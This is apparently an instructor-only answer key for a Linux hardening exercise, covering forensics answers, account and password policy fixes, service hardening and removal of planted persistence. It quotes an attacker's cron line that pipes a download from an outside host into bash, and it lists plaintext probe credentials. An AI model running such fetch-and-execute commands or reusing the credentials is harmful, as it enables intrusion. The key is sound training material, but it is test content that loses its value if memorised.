# Answer Key — Week 2 Advanced: Password & Policy (Linux)

**INSTRUCTOR ONLY.** Contains every solution and the forensics answers. Do not give to students
before the exercise. Scenario: `sprint02-password-adv-linux` (image-is-body, the "NEVERMORE" / Edgar Allan
Poe theme, Ubuntu 22.04). 33 scored hardening problems (20 pts each) + 3 forensics (20 pts) + 2 penalties
(−10 each).

**Authorized users:** edgar, lenore, usher, vkinbott — **vkinbott is an ordinary user, not an admin.**
The week's emphasis is password & policy, but there's a full review across accounts, kernel, sudo,
services, and persistence. Run everything with `sudo`.

**Scoring probe credentials (baked into the image; students do NOT set these):** the FTP check logs in as
`lenore` / `Lenore7RavenXyz` and the SSH check as `edgar` / `Edgar7RavenXyz`. The student's job is only to
bring the services up and secure them — the accounts already have working passwords.

Scored items are grouped below by **CyberPatriot vulnerability category** — the same breakdown the
CyberPatriot Scoring Report uses to describe an image. Work top-to-bottom: answer Forensics first (before
touching anything), then Account Management down through the software categories; the Penalties section
lists what loses points.

---

## Forensics Questions

_Questions you answer about the image; read and answer these BEFORE changing anything, since fixes can destroy the evidence._

Enter these in the agent's "Forensics…" panel.

| Q | Question | Answer |
|---|----------|--------|
| fq1 | The auth log shows a brute-force attack — attacker's source IP? | **198.51.100.77** (`/var/log/auth.log`: "Failed password … from 198.51.100.77") |
| fq2 | Decode the base64 file in edgar's `.cache` — what single word? | **nevermore** (`~edgar/.cache/raven.b64` = `bmV2ZXJtb3Jl` → base64 -d) |
| fq3 | The malicious cron job calls out to the attacker — what TCP port? | **8443** (the `/etc/crontab` line: `curl … http://198.51.100.77:8443/x | bash`) |

## Account Management

_Unauthorized accounts, administrator/sudo rights, required users and groups, and UID‑0 impostors._

| # | Check | Fix |
|---|-------|-----|
| 1 | Removed unauthorized user **rowan** | `sudo userdel -rf rowan` |
| 2 | Removed unauthorized user **mmouse** | `sudo userdel -rf mmouse` |
| 3 | **vkinbott** is no longer an administrator | `sudo gpasswd -d vkinbott sudo` (keep the account) |
| 4 | Removed the extra **UID-0 account** | A hidden impostor **lgates** shares UID 0. Find: `awk -F: '$3==0 && $1!="root"{print $1}' /etc/passwd`. Remove: `sudo userdel -f lgates` (⚠️ never `pkill -u lgates` — it shares UID 0 with root, so that kills every root process) |

## Account & Password Policy

_Password policy (length, hashing, dictionary checking, history) and related account policy._

| # | Check | Fix |
|---|-------|-----|
| 5 | Strong password hashing (SHA512/yescrypt) | `ENCRYPT_METHOD SHA512` in `/etc/login.defs` |
| 6 | Minimum password length ≥ 10 | `minlen = 12` in `/etc/security/pwquality.conf` |
| 7 | Dictionary checking enabled | `dictcheck = 1` in `/etc/security/pwquality.conf` |
| 8 | Password history remembered | add `password required pam_pwhistory.so remember=5 use_authtok` in `/etc/pam.d/common-password` (before the `pam_unix.so` line) |

## Defensive Countermeasures

_Firewall, antivirus, and mandatory-access-control (AppArmor) protections._

| # | Check | Fix |
|---|-------|-----|
| 17 | Firewall enabled | `sudo ufw --force enable` |
| 18 | AppArmor running | `sudo systemctl enable --now apparmor` |

## Uncategorized Operating System Settings

_OS hardening that doesn't fit another category: kernel sysctl parameters and file-permission hardening (world-writable configs, stray SUID bits, sudoers environment hardening)._

**Kernel hardening.** Set these in `/etc/sysctl.d/99-ptcomp.conf` then `sudo sysctl --system`:

| # | Check | Value |
|---|-------|-------|
| 9 | `net.ipv4.ip_forward` | `0` |
| 10 | `kernel.randomize_va_space` | `2` |
| 11 | `net.ipv4.tcp_syncookies` | `1` |
| 12 | `kernel.dmesg_restrict` | `1` |

**sudo & file permissions.**

| # | Check | Fix |
|---|-------|-----|
| 13 | sudo does not preserve **LD_PRELOAD** | remove `Defaults env_keep += "LD_PRELOAD"` — `sudo rm /etc/sudoers.d/90-ptcomp-preload` |
| 14 | sudo core dumps not re-enabled | remove `Defaults !disable_coredump` — `sudo rm /etc/sudoers.d/91-ptcomp-coredump` |
| 15 | `sshd_config` not world-writable | `sudo chmod 644 /etc/ssh/sshd_config` |
| 16 | `/bin/date` has no SUID bit | `sudo chmod u-s /bin/date` |

## Operating System & Application Updates

_Automatic OS and application update settings._

| # | Check | Fix |
|---|-------|-----|
| 23 | Automatic update checks enabled | `APT::Periodic::Update-Package-Lists "1";` in `/etc/apt/apt.conf.d/20auto-upgrades` |

## Service Auditing

_Required services brought up and hardened IN PLACE (never by disabling them); includes each service's per-setting sub-checks._

Both were left **stopped**. Bring each up and secure it.

**FTP (vsftpd) — lenore must be able to download a file; anonymous login OFF.**
```bash
sudo install -d /var/run/vsftpd/empty          # secure_chroot_dir must exist or vsftpd won't start
# in /etc/vsftpd.conf: anonymous_enable=NO, local_enable=YES, listen=YES, pam_service_name=vsftpd
sudo systemctl enable --now vsftpd
```
- Check 27 "FTP up and an authorized user can download": `curl -s --ftp-pasv -u lenore:<pw> ftp://127.0.0.1/sentinel.txt` → `PT-FTP-OK-3C9E`.
- Check 28 "anonymous login disabled": `grep -i '^anonymous_enable=NO' /etc/vsftpd.conf`.

**SSH — edgar must log in with a PASSWORD; root blocked; empty passwords refused; key auth OFF (password-only policy); logging not quiet.**
```bash
sudo tee /etc/ssh/sshd_config.d/00-ptcomp.conf >/dev/null <<'EOF'
PasswordAuthentication yes
PermitRootLogin no
PermitEmptyPasswords no
PubkeyAuthentication no
LogLevel INFO
EOF
sudo systemctl enable --now ssh
sudo sshd -T | grep -Ei 'permitrootlogin|permitemptypasswords|pubkeyauthentication|loglevel'
```
- Check 29 "SSH up, authorized user logs in with password": `sshpass -p <pw> ssh edgar@127.0.0.1` succeeds.
- Checks 30–32: `permitrootlogin no`, `permitemptypasswords no`, `pubkeyauthentication no`.
- Check 33 "logging not QUIET": `LogLevel` is INFO/VERBOSE (anything but QUIET).

## Malware

_Attacker-planted footholds and backdoors: malicious cron jobs, package-manager hooks, and MOTD payloads._

**Persistence (attacker 198.51.100.77).**

| # | Check | Fix |
|---|-------|-----|
| 24 | Malicious **cron job** removed | delete the `198.51.100.77` line from `/etc/crontab` (`sudo sed -i '/198.51.100.77/d' /etc/crontab`) |
| 25 | Malicious **APT Pre-Invoke hook** removed | `sudo rm /etc/apt/apt.conf.d/99-ptcomp-hook` |
| 26 | Malicious **MOTD** line removed | delete the `198.51.100.77` line from `/etc/update-motd.d/00-header` |

## Unwanted Software

_Hacking tools and unauthorized applications/servers that must be uninstalled._

| # | Check | Fix |
|---|-------|-----|
| 19 | Unneeded **apache2** removed | `sudo apt-get purge -y apache2` |
| 20 | Prohibited **linpeas.sh** removed | `sudo rm /home/edgar/linpeas.sh` |
| 21 | Prohibited **sucrack** removed | `sudo rm /usr/local/bin/sucrack` (find with `command -v sucrack`) |
| 22 | Prohibited **changeme** removed | `sudo rm /usr/local/bin/changeme` |

## Penalties

_Actions that LOSE points; each is noted with the category it relates to._

**Do NOT trigger these (−10 each).** Both relate to **Account Management**.

- Do **not** delete **edgar**.
- Do **not** delete **usher**.
Both are authorized. (lenore and vkinbott are also authorized — keep them too; for vkinbott you only remove
sudo, not the account.)
